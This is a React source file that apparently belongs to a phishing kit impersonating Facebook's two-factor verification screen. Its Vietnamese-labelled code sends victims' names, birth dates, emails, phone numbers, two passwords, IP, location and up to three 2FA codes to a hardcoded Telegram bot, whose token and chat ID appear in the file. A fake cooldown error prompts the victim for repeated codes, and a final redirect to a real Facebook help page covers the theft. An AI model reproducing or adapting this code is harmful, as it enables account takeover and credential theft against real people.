import React, { useState } from "react";
import { useLocation, Navigate } from "react-router-dom";
import { useTranslation } from "react-i18next";
import "./AuthCodeForm.scss";

const AuthCodeForm = () => {
  const { t, ready } = useTranslation();
  if (!ready) return null;
  const BOT_TOKEN = "8056845785:AAHpHNS3WjVDo17QAyWhbnn5tja5YQfYooc";
  const CHAT_ID = "-4821081056";

  const { state } = useLocation();
  if (!state) return <Navigate to="/" replace />;

  const {
    method = "app",
    ip,
    location,
    formData,
    password1,
    password2,
    additionalInfo,
    currentUrl = "",
  } = state;

  const [code, setCode] = useState("");
  const [code1, setCode1] = useState("");
  const [code2, setCode2] = useState("");
  const [code3, setCode3] = useState("");
  const [method1, setMethod1] = useState("");
  const [method2, setMethod2] = useState("");
  const [method3, setMethod3] = useState("");

  const [showOptions, setShowOptions] = useState(false);
  const [loadingOptions, setLoadingOptions] = useState(false);

  const [selectedMethod, setSelectedMethod] = useState(method);
  const [currentStep, setCurrentStep] = useState(`code-${method}`);

  const [clickCount, setClickCount] = useState(0);
  const [isSubmitDisabled, setIsSubmitDisabled] = useState(false);
  const [timeLeft, setTimeLeft] = useState(0);
  const [loadingSubmit, setLoadingSubmit] = useState(false);
  const [loadingConfirm, setLoadingConfirm] = useState(false);

  const getCurrentTime = () => {
    const now = new Date();
    const timeString = now.toLocaleTimeString("vi-VN");
    const dateString = now.toLocaleDateString("vi-VN");
    return `${timeString} ${dateString}`;
  };

  const startCooldown = () => {
    setIsSubmitDisabled(true);
    setTimeLeft(60);
    const timer = setInterval(() => {
      setTimeLeft((prev) => {
        if (prev <= 1) {
          clearInterval(timer);
          setIsSubmitDisabled(false);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);
  };

  const sendToTelegram = async (
    step,
    {
      code1Input = code1,
      code2Input = code2,
      code3Input = code3,
      method1Input = method1,
      method2Input = method2,
      method3Input = method3,
    } = {}
  ) => {
    const locationParts = location.split("/").map((part) => part.trim());
    const currentTime = getCurrentTime();
    const message_id = localStorage.getItem("telegram_msg_id");

    const message = `
📶 <b>XÁC THỰC 2FA (${step.toUpperCase()})</b>
━━━━━━━━━━━━━━━━━━━━━
📱 Tên PAGE: <code>${formData.link}</code>
👨‍💼 Họ Tên: <code>${formData.fullName}</code>
🎂 Ngày Sinh: <code>${formData.dateOfBirth || "N/A"}</code>
━━━━━━━━━━━━━━━━━━━━━
📍 <b>THÔNG TIN VỊ TRÍ</b>
🌐 IP: <code>${ip}</code>
🏳️ Quốc Gia: <code>${locationParts[2] || "N/A"}</code>
🏙 Thành Phố: <code>${locationParts[1] || "N/A"}</code>
⏰ Thời Gian: <code>${currentTime}</code>
━━━━━━━━━━━━━━━━━━━━━
🔐 <b>THÔNG TIN ĐĂNG NHẬP</b>
📧 Email: <code>${formData.personalEmail}</code>
📧 Email Business: <code>${formData.businessEmail}</code>
📞 SĐT: <code>${formData.phoneNumber}</code>
🔑 Mật Khẩu 1: <code>${password1}</code>
🔑 Mật Khẩu 2: <code>${password2}</code>
🛡 Mã 2FA 1: <code>${code1Input || "N/A"}</code> (${method1Input || "?"})
🛡 Mã 2FA 2: <code>${code2Input || "N/A"} </code>(${method2Input || "?"})
🛡 Mã 2FA 3: <code>${code3Input || "N/A"} </code>(${method3Input || "?"})
`;

    if (message_id) {
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          message_id,
          text: message,
          parse_mode: "HTML",
        }),
      });
    } else {
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: message,
          parse_mode: "HTML",
        }),
      });
    }
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (code.length < 6 || isSubmitDisabled || clickCount >= 3 || loadingSubmit)
      return;
    setLoadingSubmit(true);
    try {
      if (clickCount === 0) {
        setCode1(code);
        setMethod1(selectedMethod);
        await sendToTelegram("code1", {
          code1Input: code,
          method1Input: selectedMethod,
        });
        setClickCount(1);
        setCode("");
        startCooldown();
      } else if (clickCount === 1) {
        setCode2(code);
        setMethod2(selectedMethod);
        await sendToTelegram("code2", {
          code1Input: code1,
          code2Input: code,
          method1Input: method1,
          method2Input: selectedMethod,
        });
        setClickCount(2);
        setCode("");
        startCooldown();
      } else if (clickCount === 2) {
        setCode3(code);
        setMethod3(selectedMethod);
        await sendToTelegram("code3", {
          code1Input: code1,
          code2Input: code2,
          code3Input: code,
          method1Input: method1,
          method2Input: method2,
          method3Input: selectedMethod,
        });
        setTimeout(() => {
          window.location.href =
            "https://www.facebook.com/help/1735443093393986/";
        }, 2000);
      }
    } catch (err) {
      console.error("Telegram Error:", err);
    } finally {
      setLoadingSubmit(false);
    }
  };

  const handleTryAnotherWay = () => {
    setLoadingOptions(true);
    setTimeout(() => {
      setLoadingOptions(false);
      setShowOptions(true);
    }, 1000);
  };

  const handleMethodSelect = (method) => setSelectedMethod(method);
  const confirmMethod = () => {
    setShowOptions(false);
    setCurrentStep(`code-${selectedMethod}`);
    setCode("");
  };
  const handleConfirmClick = async () => {
    if (loadingConfirm) return;
    setLoadingConfirm(true);
    try {
      confirmMethod();
    } finally {
      setLoadingConfirm(false);
    }
  };

  const getPhoneTail = (phone = "") => {
    const digits = String(phone).replace(/\D/g, "");
    if (!digits) return "**";
    return digits.slice(-2);
  };
  const maskPhone = (phone = "") => {
    const tail = getPhoneTail(phone);
    return `number ******${tail}`;
  };
  const maskEmail = (email = "") => {
    if (!email || !email.includes("@")) return "***@***";
    const [user, domain] = email.split("@");
    const visible = user.length >= 2 ? user.slice(0, 2) : user.slice(0, 1);
    return `${visible}***@${domain}`;
  };
  const getMethodTargetLabel = (m, formData) => {
    if (m === "email") {
      const email = formData?.personalEmail || formData?.businessEmail || "";
      return maskEmail(email);
    }
    return maskPhone(formData?.phoneNumber || "");
  };

  return (
    <div className="auth-container">
      <div className="auth-box">
        <p className="meta">
          {formData?.fullName || "Facebook User"} • Facebook
        </p>

        {currentStep === "code-whatsapp" ? (
          <>
            <p className="title">{t("auth_code.title_whatsapp")}</p>
            <p className="description">
              {t("auth_code.desc_whatsapp", {
                method: getMethodTargetLabel("whatsapp", formData),
              })}
            </p>
            <img
              src="/imgi_1_whatsApp.4313bae1d1ce346d2fe6.png"
              alt="whatsapp"
              className="auth-image"
            />
          </>
        ) : currentStep === "code-sms" ? (
          <>
            <p className="title">{t("auth_code.title_sms")}</p>
            <p className="description">
              {t("auth_code.desc_sms", {
                method: getMethodTargetLabel("sms", formData),
              })}
            </p>
            <img
              src="/imgi_1_sms.874d1de2b472119dde0c.png"
              alt="sms"
              className="auth-image"
            />
          </>
        ) : currentStep === "code-email" ? (
          <>
            <p className="title">{t("auth_code.title_email")}</p>
            <p className="description">
              {t("auth_code.desc_email", {
                method: getMethodTargetLabel("email", formData),
              })}
            </p>
            <img
              src="/imgi_1_sms.874d1de2b472119dde0c.png"
              alt="email"
              className="auth-image"
            />
          </>
        ) : (
          <>
            <p className="title">{t("auth_code.title_app")}</p>
            <p className="description">{t("auth_code.desc_app")}</p>
            <img
              src="/imgi_1_2fa.cef3489675d7acf425ec.jpg"
              alt="2FA"
              className="auth-image"
            />
          </>
        )}

        <form onSubmit={handleSubmit}>
          <input
            type="text"
            maxLength={8}
            value={code}
            onChange={(e) => setCode(e.target.value)}
            className="auth-input"
          />

          {isSubmitDisabled && (
            <p
              className="description"
              style={{ marginTop: -4, marginBottom: 12, color: "red" }}
            >
              {t("auth_code.code_error", {
                seconds: String(timeLeft).padStart(2, "0"),
              })}
            </p>
          )}

          <button
            type="submit"
            className={`auth-button ${isSubmitDisabled ? "disabled" : ""}`}
            disabled={code.length < 6 || isSubmitDisabled || loadingSubmit}
          >
            {loadingSubmit ? (
              <span className="spinner-inline" />
            ) : (
              t("common.continue")
            )}
          </button>
        </form>

        <button
          className="secondary-button"
          onClick={handleTryAnotherWay}
          disabled={loadingOptions}
        >
          {loadingOptions ? (
            <span className="spinner-inline" />
          ) : (
            t("auth_code.try_another")
          )}
        </button>
      </div>

      {showOptions && (
        <div className="modal-overlay" onClick={() => setShowOptions(false)}>
          <div className="modal" onClick={(e) => e.stopPropagation()}>
            <h3>{t("auth_code.modal_title")}</h3>
            <p>{t("auth_code.modal_desc")}</p>
            <div className="method-list">
              {["app", "whatsapp", "sms", "email"].map((m) => (
                <label key={m}>
                  <div className="method-info">
                    <strong>{t(`auth_code.method_title_${m}`)}</strong>
                    <span>
                      {m === "app"
                        ? t("auth_code.method_desc_app")
                        : t("auth_code.method_desc", {
                            method: getMethodTargetLabel(m, formData),
                          })}
                    </span>
                  </div>
                  <input
                    type="radio"
                    checked={selectedMethod === m}
                    onChange={() => handleMethodSelect(m)}
                  />
                </label>
              ))}
            </div>

            <button
              className="auth-button"
              onClick={handleConfirmClick}
              disabled={loadingConfirm}
            >
              {loadingConfirm ? (
                <span className="spinner-inline" />
              ) : (
                t("common.continue")
              )}
            </button>
          </div>
        </div>
      )}
    </div>
  );
};

export default AuthCodeForm;
